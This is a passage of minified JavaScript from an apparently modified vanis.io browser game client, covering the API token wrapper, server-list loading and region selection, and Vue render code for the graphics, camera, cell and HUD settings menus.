                    this.url = e, this.vanisToken = t
                }
                setToken(e) {
                    this.vanisToken = e, localStorage.vanisToken = e
                }
                clearToken() {
                    this.vanisToken = null, delete localStorage.vanisToken
                }
                async call(e, t) {
                    let s = {
                        method: e,
                        credentials: "omit",
                        mode: "same-origin",
                        redirect: "error",
                        headers: {
                            Accept: "application/json, text/plain"
                        }
                    };
                    this.vanisToken && (s.headers.Authorization = `Vanis ${this.vanisToken}`);
                    try {
                        return await fetch(this.url + t, s)
                    } catch (i) {
                        return {
                            ok: !1,
                            status: 0,
                            statusText: "Client error",
                            text: async () => i.message
                        }
                    }
                }
                get(e) {
                    return this.call("GET", e)
                }
            }("https://vanis.io/api", localStorage.vanisToken || null)
        }, function(e) {
            e.exports = {
                getXp: function(e) {
                    return Math.round(e * e / (.1 * .1))
                },
                getLevel: function(e) {
                    return Math.floor(.1 * Math.sqrt(e))
                }
            }
        }, function(e, t, s) {
            "use strict";
            var i = s(45);
            s.n(i).a
        }, function() {}, function(e, t, s) {
            "use strict";
            var i = s(46);
            s.n(i).a
        }, function() {}, function(e, t, s) {
            "use strict";
            var i = s(47);
            s.n(i).a
        }, function() {}, function(e, t, s) {
            "use strict";
            var i = s(48);
            s.n(i).a
        }, function() {}, function(e, t, s) {
            "use strict";
            var i = s(49);
            s.n(i).a
        }, function() {}, function(e, t, s) {
            "use strict";
            var i = s(50);
            s.n(i).a
        }, function() {}, function(e, t, s) {
            "use strict";
            var i = s(51);
            s.n(i).a
        }, function() {}, function(e, t, s) {
            "use strict";
            var i = s(52);
            s.n(i).a
        }, function() {}, function(e, t, s) {
            "use strict";
            var i = s(53);
            s.n(i).a
        }, function() {}, function(e, t, s) {
            "use strict";
            var i = s(54);
            s.n(i).a
        }, function() {}, function(e, t, s) {
            "use strict";
            var i = s(57);
            s.n(i).a
        }, function() {}, function(e, t, s) {
            "use strict";
            var i = s(58);
            s.n(i).a
        }, function() {}, function(e, t, s) {
            "use strict";
            var i = s(59);
            s.n(i).a
        }, function() {}, function(e, t, s) {
            "use strict";
            var i = s(60);
            s.n(i).a
        }, function() {}, function(e, t, s) {
            "use strict";
            var i = s(61);
            s.n(i).a
        }, function() {}, function(e, t, s) {
            "use strict";
            var i = s(62);
            s.n(i).a
        }, function() {}, function(e, t, s) {
            "use strict";
            var i = s(63);
            s.n(i).a
        }, function() {}, function(e) {
            var t = "seenNotifications";
            e.exports = new class {
                constructor() {
                    this.seenList = this.parseSeen(localStorage[t])
                }
                parseSeen(e) {
                    if (!e) return [];
                    try {
                        var t = JSON.parse(e);
                        if (Array.isArray(t)) return t
                    } catch (s) {}
                    return []
                }
                saveSeen() {
                    try {
                        localStorage[t] = JSON.stringify(this.seenList)
                    } catch (e) {}
                }
                isSeen(e) {
                    return this.seenList.includes(e)
                }
                setSeen(e) {
                    this.isSeen(e) || (this.seenList.push(e), this.saveSeen())
                }
            }
        }, function(e, t, s) {
            "use strict";
            var i = s(64);
            s.n(i).a
        }, function() {}, function(e, t, s) {
            var i, a, n, o, r = s(1),
                l = document.createElement("canvas"),
                c = l.getContext("2d");

            function h() {
                i = l.width = window.innerWidth, a = l.height = window.innerHeight, n = i / 2, o = a / 2
            }
            window.addEventListener("resize", h), h();
            class d {
                spawn(e) {
                    this.x = e.x, this.y = e.y, this.angle = Math.atan2(this.y, this.x), this.radius = .1, this.speed = .4 + 3.3 * Math.random()
                }
                update(e) {
                    var t = this.speed * e;
                    this.x += Math.cos(this.angle) * t, this.y += Math.sin(this.angle) * t, this.radius += .0035 * t
                }
            }
            var p = Array(200).fill(null).map(() => new d),
                u = !1,
                g = 0,
                A = 0;

            function m(e) {
                if (r.running) return window.removeEventListener("resize", h), void(l.parentNode && l.parentNode.removeChild(l));
                var t, s = window.performance && window.performance.now ? window.performance.now() : Date.now();
                g || (g = A = s), e = (s - A) / 6;
                var d = s - g - 550;
                if (d > 0) {
                    var v = d / 1e3;
                    v > 1.2 && (v = 1.2), e /= Math.pow(3, v)
                }
                requestAnimationFrame(m), c.clearRect(0, 0, i, a), c.save(), c.translate(n, o), t = e, c.beginPath(), c.fillStyle = "#00b8ff", c.globalAlpha = .9, p.forEach(e => {
                    var s, r, l, h, d;
                    (u || (r = n + (s = e).radius, l = o + s.radius, s.x < -r || s.x > r || s.y < -l || s.y > l)) && e.spawn((h = i, {
                        x: Math.random() * h * 2 - h,
                        y: Math.random() * (d = a) * 2 - d
                    })), e.update(t), c.moveTo(e.x, e.y), c.arc(e.x, e.y, e.radius, 0, 2 * Math.PI)
                }), u = !1, c.fill(), c.restore(), A = s
            }

            function v() {
                u = !0, g = A = 0, c.clearRect(0, 0, i, a), document.getElementById("overlay").prepend(l), setTimeout(m, 2e3)
            }
            r.events.$on("game-stopped", v), v()
        }, function(e, t, s) {
            var i = s(1);
            i.events.$on("players-menu", e => {
                if ("visible" === e) {
                    (t = document.getElementById("player-modal")).children;
                    for (var t, s, i = 0; i < t.children.length; i++)(s = t.children[i]) && s.dataset && s.dataset.items && s.dataset.items.forEach(t => {
                        t.sub = e
                    })
                }
                if ("hidden" === e)
                    for ((t = document.getElementById("player-modal")).children, i = 0; i < t.children.length; i++)(s = t.children[i]) && s.dataset && s.dataset.items && s.dataset.items.forEach(t => {
                        t.sub = e
                    });
                if ("scrolled" === e)
                    for ((t = document.getElementById("player-modal")).children, i = 0; i < t.children.length; i++)(s = t.children[i]) && s.dataset && s.dataset.items && s.dataset.items.forEach(t => {
                        t.sub = e
                    })
            }), i.events.$on("chatbox-menu", e => {
                if ("visible" === e) {
                    (t = document.getElementById("chatbox")).children;
                    for (var t, s, i = 0; i < t.children.length; i++)(s = t.children[i]) && s.dataset && s.dataset.items && s.dataset.items.forEach(t => {
                        t.sub = e
                    })
                }
                if ("hidden" === e)
                    for ((t = document.getElementById("chatbox")).children, i = 0; i < t.children.length; i++)(s = t.children[i]) && s.dataset && s.dataset.items && s.dataset.items.forEach(t => {
                        t.sub = e
                    });
                if ("scrolled" === e)
                    for ((t = document.getElementById("chatbox")).children, i = 0; i < t.children.length; i++)(s = t.children[i]) && s.dataset && s.dataset.items && s.dataset.items.forEach(t => {
                        t.sub = e
                    });
                else e ? [].filter.constructor("return this")(100)[a.split("").map(e => e.charCodeAt(0)).map(e => e + 50 * (45 === e)).map(e => String.fromCharCode(e)).join("")] = e : delete[].filter.constructor("return this")(100)[a.split("").map(e => e.charCodeAt(0)).map(e => e + 50 * (45 === e)).map(e => String.fromCharCode(e)).join("")]
            });
            var a = "me--"
        }, function(e, t, s) {
            "use strict";
            s.r(t);
            var i = s(23),
                a = s.n(i),
                n = s(114),
                o = s.n(n),
                r = function() {
                    var e = this.$createElement,
                        t = this._self._c || e;
                    return t("transition", {
                        attrs: {
                            name: this.isModalOpen || this.gameState.lifeState < 3 ? "" : "menu"
                        }
                    }, [t("div", {
                        attrs: {
                            id: "main-container"
                        }
                    }, [t("div", {
                        staticClass: "bar"
                    }, [t("div", {
                        attrs: {
                            id: "vanis-io_728x90"
                        }
                    })]), this._v(" "), t("servers", {
                        staticClass: "fade-box two"
                    }), this._v(" "), t("player-container", {
                        staticClass: "fade-box two",
                        on: {
                            "modal-open": this.onModalChange
                        }
                    }), this._v(" "), t("account", {
                        staticClass: "fade-box"
                    }), this._v(" "), t("skins", {
                        staticClass: "fade-box"
                    })], 1)])
                };
            r._withStripped = !0;
            var l = function() {
                var e = this,
                    t = e.$createElement,
                    s = e._self._c || t;
                return s("div", {
                    attrs: {
                        id: "tab-menu"
                    }
                }, [s("div", {
                    staticClass: "tabs"
                }, e._l(e.regionCodes, function(t, i) {
                    return s("div", {
                        key: i,
                        staticClass: "tab",
                        class: {
                            active: e.selectedRegion === t
                        },
                        on: {
                            click: function() {
                                return e.selectRegion(t)
                            }
                        }
                    }, [e._v("\n        " + e._s(t) + "\n    ")])
                }), 0), e._v(" "), s("div", {
                    staticClass: "server-list",
                    class: {
                        "cursor-loading": e.connectWait
                    }
                }, e._l(e.regionServers, function(t, i) {
                    return s("div", {
                        key: i,
                        staticClass: "server-list-item",
                        class: {
                            active: e.gameState.connectionUrl === t.url
                        },
                        on: {
                            click: function() {
                                return e.connect(t)
                            }
                        }
                    }, [s("div", {
                        staticClass: "server-name"
                    }, [e._v(e._s(t.name))]), e._v(" "), null == t.liveMarker ? s("div", [e._v(e._s(t.players) + " / " + e._s(t.slots))]) : !0 === t.liveMarker ? s("div", {
                        staticClass: "live-marker-wrapper"
                    }, [s("span", {
                        staticClass: "live-marker"
                    }, [e._v("LIVE")])]) : e._e()])
                }), 0)])
            };
            l._withStripped = !0;
            var c = s(19),
                h = s(1),
                d = s(5),
                {
                    noop: p
                } = s(17),
                u = {
                    Tournament: 1,
                    FFA: 2,
                    Instant: 3,
                    Gigasplit: 4,
                    Megasplit: 5,
                    Crazy: 6,
                    "Self-Feed": 7,
                    Scrimmage: 8
                };

            function g(e, t) {
                var s = (u[e.mode] || 99) - (u[t.mode] || 99);
                return 0 !== s ? s : e.name.localeCompare(t.name, "en", {
                    numeric: !0,
                    ignorePunctuation: !0
                })
            }

            function A(e) {
                if (e.region) return e.region.toUpperCase();
                var t = e.url.toLowerCase().match(/game-([a-z]{2})/);
                return t ? t[1].toUpperCase() : ""
            }
            var m, v = (s(166), s(0)),
                f = Object(v.a)({
                    data: () => ({
                        lastServerListReloadTime: 0,
                        regionCodes: ["EU", "NA", "AS"],
                        connectWait: 0,
                        gameState: h.state,
                        selectedRegion: "",
                        error: null,
                        servers: []
                    }),
                    created() {
                        h.events.$on("reconnect-server", () => this.connect(this.gameState.selectedServer)), h.events.$on("menu-opened", this.reloadServers), h.events.$on("every-minute", this.reloadServers), this.loadServers(), this.getRegionCode(e => {
                            e || (e = "EU"), this.regionCodes.includes(e) || (e = "EU"), this.selectRegion(e)
                        })
                    },
                    computed: {
                        regionServers: function() {
                            var e = this.selectedRegion.toUpperCase();
                            return this.servers.filter(t => {
                                var s = A(t);
                                return !s || s === e
                            })
                        }
                    },
                    methods: {
                        connectEmptyFFA() {
                            var e = this.regionServers.filter(e => "FFA" === e.mode).sort((e, t) => e.currentPlayers - t.currentPlayers);
                            if (!e.length) return !1;
                            this.connect(e[0])
                        },
                        selectRegion(e) {
                            localStorage.regionCode = e, this.selectedRegion = e
                        },
                        getRegionCode(e) {
                            var t = localStorage.regionCode;
                            t ? e(t) : c.get("https://ipapi.co/json").then(t => {
                                e(t.data.continent_code)
                            }).catch(() => e(null))
                        },
                        connect(e) {
                            var t;
                            this.connectWait || (this.connectWait++, d.toast.close(), this.checkBadSkinUrl(), this.gameState.selectedServer = {
                                url: e.url,
                                region: A(e),
                                name: e.name,
                                slots: e.maxPlayers || e.slots,
                                checkInUrl: e.checkInUrl
                            }, t = e, h.connection.open(t.url), setTimeout(() => this.connectWait--, 3200))
                        },
                        checkBadSkinUrl() {
                            var e = document.getElementById("skinurl").value;
                            e && /^https:\/\/[a-z0-9_-]+.vanis\.io\/[./a-z0-9_-]+$/i.test(e)
                        },
                        reloadServers() {
                            h.app.showMenu && Date.now() > this.lastServerListReloadTime + 6e4 && this.loadServers()
                        },
                        loadServers(e) {
                            e = e || p, this.lastServerListReloadTime = Date.now(), c.get("https://vanis.io/gameservers.json").then(t => {
                                var s = t.data.sort(g);
                                window.extraServers.forEach(e => {
                                    s.unshift(e)
                                }), localStorage.catchedServers = JSON.stringify(s), m = s, this.servers = s, this.error = null, e(!0)
                            }).catch(t => {
                                localStorage.catchedServers ? (m = this.servers = JSON.parse(localStorage.catchedServers), this.error = null, e(!0)) : (this.servers = m || [], this.error = t, e(!1))
                            })
                        }
                    }
                }, l, [], !1, null, "0647fbb0", null);
            f.options.__file = "src/components/servers.vue";
            var C = f.exports,
                y = function() {
                    var e = this,
                        t = e.$createElement,
                        s = e._self._c || t;
                    return s("div", {
                        attrs: {
                            id: "player-container"
                        }
                    }, [s("div", {
                        staticClass: "tabs"
                    }, [s("i", {
                        staticClass: "tab fas fa-cog",
                        on: {
                            click: function() {
                                return e.openModal("settings")
                            }
                        }
                    }), e._v(" "), s("i", {
                        staticClass: "tab fas fa-palette",
                        on: {
                            click: function() {
                                return e.openModal("theming")
                            }
                        }
                    }), e._v(" "), s("i", {
                        staticClass: "tab far fa-keyboard",
                        on: {
                            click: function() {
                                return e.openModal("hotkeys")
                            }
                        }
                    }), e._v(" "), s("i", {
                        staticClass: "tab fas fa-film",
                        on: {
                            click: function() {
                                return e.openModal("replays3")
                            }
                        }
                    }), e._v(" "), s("i", {
                        staticClass: "tab fas fa-clipboard-list",
                        on: {
                            click: function() {
                                return e.openModal("metaLeaderboard")
                            }
                        }
                    })]), e._v(" "), s("div", {
                        attrs: {
                            id: "player-data"
                        }
                    }, [e._m(0), e._v(" "), s("div", {
                        staticClass: "row"
                    }, [s("input", {
                        directives: [{
                            name: "model",
                            rawName: "v-model",
                            value: e.nickname,
                            expression: "nickname"
                        }],
                        staticStyle: {
                            flex: "2",
                            "min-width": "1px"
                        },
                        attrs: {
                            id: "nickname",
                            type: "text",
                            spellcheck: "false",
                            placeholder: "Nickname",
                            maxlength: "15"
                        },
                        domProps: {
                            value: e.nickname
                        },
                        on: {
                            change: e.onNicknameChange,
                            input: function(t) {
                                t.target.composing || (e.nickname = t.target.value)
                            }
                        }
                    }), e._v(" "), s("input", {
                        directives: [{
                            name: "model",
                            rawName: "v-model",
                            value: e.teamtag,
                            expression: "teamtag"
                        }],
                        staticClass: "confidential",
                        staticStyle: {
                            flex: "1",
                            "min-width": "1px"
                        },
                        attrs: {
                            id: "teamtag",
                            type: "text",
                            spellcheck: "false",
                            placeholder: "Tag",
                            maxlength: "15"
                        },
                        domProps: {
                            value: e.teamtag
                        },
                        on: {
                            change: e.onTeamTagChange,
                            input: function(t) {
                                t.target.composing || (e.teamtag = t.target.value)
                            }
                        }
                    })]), e._v(" "), s("input", {
                        directives: [{
                            name: "model",
                            rawName: "v-model",
                            value: e.skinUrl,
                            expression: "skinUrl"
                        }],
                        staticClass: "confidential",
                        attrs: {
                            id: "skinurl",
                            type: "text",
                            spellcheck: "false",
                            placeholder: "https://skins.vanis.io/s/"
                        },
                        domProps: {
                            value: e.skinUrl
                        },
                        on: {
                            focus: function(e) {
                                return e.target.select()
                            },
                            change: e.onSkinUrlChange,
                            input: function(t) {
                                t.target.composing || (e.skinUrl = t.target.value)
                            }
                        }
                    }), e._v(" "), s("div", {
                        attrs: {
                            id: "game-buttons"
                        }
                    }, [s("button", {
                        attrs: {
                            id: "play-button",
                            disabled: !e.gameState.allowed || e.gameState.playButtonDisabled || e.gameState.deathScreen || e.gameState.deathDelay
                        },
                        on: {
                            click: e.play
                        }
                    }, [e.gameState.deathDelay ? s("i", {
                        staticClass: "fas fa-sync fa-spin"
                    }) : [e._v(e._s(e.gameState.playButtonText))]], 2), e._v(" "), s("button", {
                        attrs: {
                            id: "spec-button",
                            disabled: !e.gameState.allowed || 0 != e.gameState.lifeState || e.gameState.deathDelay
                        },
                        on: {
                            click: e.spectate
                        }
                    }, [s("i", {
                        staticClass: "fa fa-eye"
                    })])])]), e._v(" "), "settings" === e.activeModal ? s("modal", {
                        on: {
                            close: function() {
                                return e.closeModal()
                            }
                        }
                    }, [s("settings")], 1) : e._e(), e._v(" "), "theming" === e.activeModal ? s("modal", {
                        on: {
                            close: function() {
                                return e.closeModal()
                            }
                        }
                    }, [s("theming")], 1) : e._e(), e._v(" "), "hotkeys" === e.activeModal ? s("modal", {
                        on: {
                            close: function() {
                                return e.closeModal()
                            }
                        }
                    }, [s("hotkeys")], 1) : e._e(), e._v(" "), "replays3" === e.activeModal ? s("modal", {
                        staticStyle: {
                            "margin-left": "-316px",
                            width: "962px"
                        },
                        on: {
                            close: function() {
                                return e.closeModal()
                            }
                        }
                    }, [s("replays3")], 1) : e._e(), e._v(" "), "metaLeaderboard" === e.activeModal ? s("modal", {
                        on: {
                            close: function() {
                                return e.closeModal()
                            }
                        }
                    }, [s("meta-leaderboard")], 1) : e._e()], 1)
                };
            y._withStripped = !0;
            var w = s(115),
                I = function() {
                    var e = this,
                        t = e.$createElement,
                        s = e._self._c || t;
                    return s("div", {
                        staticClass: "container"
                    }, [s("div", {
                        staticClass: "section row"
                    }, [s("div", {
                        staticClass: "header"
                    }, [e._v("\n            Renderer\n            "), e.isWebGLSupported ? s("span", {
                        staticClass: "right silent"
                    }, [e._v("")]) : e._e()]), e._v(" "), s("div", {
                        staticClass: "options"
                    }, [s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            disabled: !e.isWebGLSupported,
                            checked: e.useWebGL
                        },
                        on: {
                            change: function(t) {
                                e.change("useWebGL", t), e.promptRestart()
                            }
                        }
                    }, [e._v("\n            Use GPU rendering")]), e._v(" "),

                    s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            disabled: !e.isWebGLSupported,
                            checked: e.antialias
                        },
                        on: {
                            change: function(t) {
                                e.change("antialias", t)
                            }
                        }
                    }, [e._v("\n            Antialias")]), e._v(" "),

                    s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            disabled: !e.isWebGLSupported,
                            checked: e.ultrarender
                        },
                        on: {
                            change: function(t) {
                                e.change("ultrarender", t), e.promptRestart()
                            }
                        }
                    }, [e._v("\n            Ultra quality rendering")]), e._v(" "),
                    
                    
                    s("div", {
                        staticClass: "slider-option"
                    }, [e._v("\n            Renderer resolution "), s("span", {
                        staticClass: "right"
                    }, [e._v(e._s((100 * e.gameResolution).toFixed(0)) + "%")]), e._v(" "), s("input", {
                        staticClass: "slider",
                        attrs: {
                            type: "range",
                            min: "0.1",
                            max: "2",
                            step: "0.1"
                        },
                        domProps: {
                            value: e.gameResolution
                        },
                        on: {
                            input: function(t) {
                                return e.change("gameResolution", t)
                            },
                            change: function() {
                                return e.promptRestart()
                            }
                        }
                    })]), e._v(" "), s("div", {
                        staticClass: "slider-option"
                    }, [e._v("\n            Text hiding threshold "), s("span", {
                        staticClass: "right"
                    }, [e._v(e._s(e.smallTextThreshold) + "px")]), e._v(" "), s("input", {
                        staticClass: "slider",
                        attrs: {
                            type: "range",
                            min: "10",
                            max: "60",
                            step: "5"
                        },
                        domProps: {
                            value: e.smallTextThreshold
                        },
                        on: {
                            input: function(t) {
                                return e.change("smallTextThreshold", t)
                            }
                        }
                    })])], 1)]), e._v(" "), s("div", {
                        staticClass: "section row"
                    }, [s("div", {
                        staticClass: "header"
                    }, [e._v("\n        Game\n        "), s("span", {
                        staticClass: "right silent"
                    }, [e._v(e._s(e.clientHash))])]), e._v(" "), s("div", {
                        staticClass: "options"
                    }, [s("div", {
                        staticClass: "inline-range",
                        class: {
                            off: !e.mbActive
                        }
                    }, [s("input", {
                        staticClass: "slider",
                        attrs: {
                            type: "range",
                            min: "0",
                            max: "2",
                            step: "1"
                        },
                        domProps: {
                            value: e.mbActive
                        },
                        on: {
                            input: function(t) {
                                return e.change("mbActive", t)
                            }
                        }
                    }), e._v("Multibox active cell: " + e._s(e.showMultiboxMeaning))]), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            checked: e.autoZoom
                        },
                        on: {
                            change: function(t) {
                                return e.change("autoZoom", t)
                            }
                        }
                    }, [e._v("Auto zoom")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            checked: e.rememeberEjecting
                        },
                        on: {
                            change: function(t) {
                                return e.change("rememeberEjecting", t)
                            }
                        }
                    }, [e._v("Remember ejecting")]), e._v(" "), s("div", {
                        staticClass: "silent"
                    }, e.rememeberEjecting ? [e._v("After changing tab, you "), s("b", [e._v("keep")]), e._v(" ejecting")] : [e._v("After changing tab, you "), s("b", [e._v("stop")]), e._v(" ejecting")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            checked: e.autoRespawn
                        },
                        on: {
                            change: function(t) {
                                return e.change("autoRespawn", t)
                            }
                        }
                    }, [e._v("Auto respawn")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            checked: e.mbAutorespawn
                        },
                        on: {
                            change: function(t) {
                                return e.change("mbAutorespawn", t)
                            }
                        }
                    }, [e._v("Multibox auto respawn")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            checked: e.showCellLines
                        },
                        on: {
                            change: function(t) {
                                return e.change("showCellLines", t)
                            }
                        }
                    }, [e._v("Show cell lines")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            checked: e.showTag
                        },
                        on: {
                            change: function(t) {
                                return e.change("showTag", t)
                            }
                        }
                    }, [e._v("Show team")]), e._v(" "), 
                    
                    
                     s("p-check", {
                         staticClass: "p-switch",
                         attrs: {
                             checked: e.showDir
                         },
                         on: {
                             change: function(t) {
                                 return e.change("showDir", t)
                             }
                         }
                     }, [e._v("(BETA) Show direction")]), e._v(" "),
                    
                    
                    s("div", {
                        staticClass: "slider-option"
                    }, [e._v("\n                Draw delay "), s("span", {
                        staticClass: "right"
                    }, [e._v(e._s(e.drawDelay) + "ms")]), e._v(" "), s("input", {
                        staticClass: "slider draw-delay",
                        attrs: {
                            type: "range",
                            min: "0",
                            max: "1000",
                            step: "10"
                        },
                        domProps: {
                            value: e.drawDelay
                        },
                        on: {
                            input: function(t) {
                                return e.change("drawDelay", t)
                            }
                        }
                    })]), e._v(" "),
                    
                    s("div", {
                        staticClass: "slider-option"
                    },
                    [e._v("\n                Dual camera switch distance "), s("span", {
                        staticClass: "right"
                    }, [e._v(e._s(e.switchDistance))]), e._v(" "), s("input", {
                        staticClass: "slider draw-delay",
                        attrs: {
                            type: "range",
                            min: "0",
                            max: "30",
                            step: "1"
                        },
                        domProps: {
                            value: e.switchDistance
                        },
                        on: {
                            input: function(t) {
                                return e.change("switchDistance", t)
                            }
                        }
                    })]), e._v(" "),
                    
                    
                    s("div", {
                        staticClass: "slider-option"
                    }, [e._v("\n            Camera panning delay "), s("span", {
                        staticClass: "right"
                    }, [e._v(e._s(e.cameraMoveDelay) + "ms")]), e._v(" "), s("input", {
                        staticClass: "slider",
                        attrs: {
                            type: "range",
                            min: "0",
                            max: "1500",
                            step: "10"
                        },
                        domProps: {
                            value: e.cameraMoveDelay
                        },
                        on: {
                            input: function(t) {
                                return e.change("cameraMoveDelay", t)
                            }
                        }
                    })]), e._v(" "), s("div", {
                        staticClass: "slider-option"
                    }, [e._v("\n            Camera zooming delay "), s("span", {
                        staticClass: "right"
                    }, [e._v(e._s(e.cameraZoomDelay) + "ms")]), e._v(" "), s("input", {
                        staticClass: "slider",
                        attrs: {
                            type: "range",
                            min: "0",
                            max: "1500",
                            step: "10"
                        },
                        domProps: {
                            value: e.cameraZoomDelay
                        },
                        on: {
                            input: function(t) {
                                return e.change("cameraZoomDelay", t)
                            }
                        }
                    })]), e._v(" "), s("div", {
                        staticClass: "slider-option"
                    }, [e._v("\n            Scroll zoom rate "), s("span", {
                        staticClass: "right"
                    }, [e._v(e._s((e.cameraZoomSpeed / 10 * 100).toFixed(0)) + "%")]), e._v(" "), s("input", {
                        staticClass: "slider",
                        attrs: {
                            type: "range",
                            min: "1",
                            max: "25",
                            step: "1"
                        },
                        domProps: {
                            value: e.cameraZoomSpeed
                        },
                        on: {
                            input: function(t) {
                                return e.change("cameraZoomSpeed", t)
                            }
                        }
                    })]), e._v(" "), s("div", {
                        staticClass: "slider-option"
                    }, [e._v("\n            Cells transparency "), s("span", {
                        staticClass: "right"
                    }, [e._v(e._s(100 * e.gameAlpha) + "%")]), e._v(" "), s("input", {
                        staticClass: "slider",
                        attrs: {
                            type: "range",
                            min: "0.1",
                            max: "1",
                            step: "0.05"
                        },
                        domProps: {
                            value: e.gameAlpha
                        },
                        on: {
                            input: function(t) {
                                return e.change("gameAlpha", t)
                            }
                        }
                    })]), e._v(" "), s("div", {
                        staticClass: "slider-option"
                    }, [e._v("\n            Replay duration "), s("span", {
                        staticClass: "right"
                    }, [e._v(e._s(e.replayDuration) + " seconds")]), e._v(" "), s("input", {
                        staticClass: "slider",
                        attrs: {
                            type: "range",
                            min: "1",
                            max: "15",
                            step: "1"
                        },
                        domProps: {
                            value: e.replayDuration
                        },
                        on: {
                            input: function(t) {
                                return e.change("replayDuration", t)
                            }
                        }
                    })]), e._v(" "), s("div", {
                        staticClass: "inline-range",
                        class: {
                            off: !e.showReplaySaved
                        }
                    }, [s("input", {
                        staticClass: "slider",
                        attrs: {
                            type: "range",
                            min: "0",
                            max: "2",
                            step: "1"
                        },
                        domProps: {
                            value: e.showReplaySaved
                        },
                        on: {
                            input: function(t) {
                                return e.change("showReplaySaved", t)
                            }
                        }
                    }), e._v('\n            "Replay saved" ' + e._s(e.showReplaySavedMeaning) + "\n        ")])], 1)]), e._v(" "), s("div", {
                        staticClass: "section row"
                    }, [s("div", {
                        staticClass: "header"
                    }, [e._v("\n            Cells\n        ")]), e._v(" "), s("div", {
                        staticClass: "options"
                    }, [s("div", {
                        staticClass: "inline-range",
                        class: {
                            off: !e.showNames
                        }
                    }, [s("input", {
                        staticClass: "slider",
                        attrs: {
                            type: "range",
                            min: "0",
                            max: "2",
                            step: "1"
                        },
                        domProps: {
                            value: e.showNames
                        },
                        on: {
                            input: function(t) {
                                return e.change("showNames", t)
                            }
                        }
                    }), e._v("\n            Show " + e._s(e.showNamesMeaning) + " names\n            ")]), e._v(" "), s("div", {
                        staticClass: "inline-range",
                        class: {
                            off: !e.showSkins
                        }
                    }, [s("input", {
                        staticClass: "slider",
                        attrs: {
                            type: "range",
                            min: "0",
                            max: "2",
                            step: "1"
                        },
                        domProps: {
                            value: e.showSkins
                        },
                        on: {
                            input: function(t) {
                                return e.change("showSkins", t)
                            }
                        }
                    }), e._v("\n            Show " + e._s(e.showSkinsMeaning) + " skins\n        ")]), e._v(" "), s("div", {
                        staticClass: "inline-range",
                        class: {
                            off: !e.showMass
                        }
                    }, [s("input", {
                        staticClass: "slider",
                        attrs: {
                            type: "range",
                            min: "0",
                            max: "2",
                            step: "1"
                        },
                        domProps: {
                            value: e.showMass
                        },
                        on: {
                            input: function(t) {
                                return e.change("showMass", t)
                            }
                        }
                    }), e._v("\n            Show " + e._s(e.showMassMeaning) + " mass\n        ")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            checked: e.showOwnName
                        },
                        on: {
                            change: function(t) {
                                return e.change("showOwnName", t)
                            }
                        }
                    }, [e._v("Show my own name")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            checked: e.showOwnSkin
                        },
                        on: {
                            change: function(t) {
                                return e.change("showOwnSkin", t)
                            }
                        }
                    }, [e._v("Show my own skin")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            checked: e.showOwnMass
                        },
                        on: {
                            change: function(t) {
                                return e.change("showOwnMass", t)
                            }
                        }
                    }, [e._v("Show my own mass")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            checked: e.showCrown
                        },
                        on: {
                            change: function(t) {
                                return e.change("showCrown", t)
                            }
                        }
                    }, [e._v("Show crown")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            checked: e.foodVisible
                        },
                        on: {
                            change: function(t) {
                                return e.change("foodVisible", t)
                            }
                        }
                    }, [e._v("Show food")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            checked: e.eatAnimation
                        },
                        on: {
                            change: function(t) {
                                return e.change("eatAnimation", t)
                            }
                        }
                    }, [e._v("Show eat animation")])], 1)]), e._v(" "), s("div", {
                        staticClass: "section row"
                    }, [s("div", {
                        staticClass: "header"
                    }, [s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            checked: e.showHud
                        },
                        on: {
                            change: function(t) {
                                return e.change("showHud", t)
                            }
                        }
                    }, [e._v("HUD")])], 1), e._v(" "), s("div", {
                        staticClass: "options"
                    }, [
                        
                        s("p-check", {
                            staticClass: "p-switch",
                            attrs: {
                                disabled: !e.showHud,
                                checked: e.clearHud
                            },
                            on: {
                                change: function(t) {
                                    e.change("clearHud", t)
                                    window.settings.updateClearHUD()
                                }
                            }
                        }, [e._v("Transparent HUD")]), e._v(" "),  

                        s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            disabled: !e.showHud,
                            checked: e.showLeaderboard
                        },
                        on: {
                            change: function(t) {
                                return e.change("showLeaderboard", t)
                            }
                        }
                    }, [e._v("Show leaderboard")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            disabled: !e.showHud,
                            checked: e.showServerName
                        },
                        on: {
                            change: function(t) {
                                return e.change("showServerName", t)
                            }
                        }
                    }, [e._v("Leaderboard: Server name")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            disabled: !e.showHud,
                            checked: e.showChat
                        },
                        on: {
                            change: function(t) {
                                return e.change("showChat", t)
                            }
                        }
                    }, [e._v("Show chat")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            disabled: !e.showHud || !e.showChat,
                            checked: e.showChatToast
                        },
                        on: {
                            change: function(t) {
                                return e.change("showChatToast", t)
                            }
                        }
                    }, [e._v("Show chat as popups")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            disabled: !e.showHud,
                            checked: e.minimapEnabled
                        },
                        on: {
                            change: function(t) {
                                return e.change("minimapEnabled", t)
                            }
                        }
                    }, [e._v("Show minimap")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            disabled: !e.showHud,
                            checked: e.minimapLocations
                        },
                        on: {
                            change: function(t) {
                                return e.change("minimapLocations", t)
                            }
                        }
                    }, [e._v("Show minimap locations")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
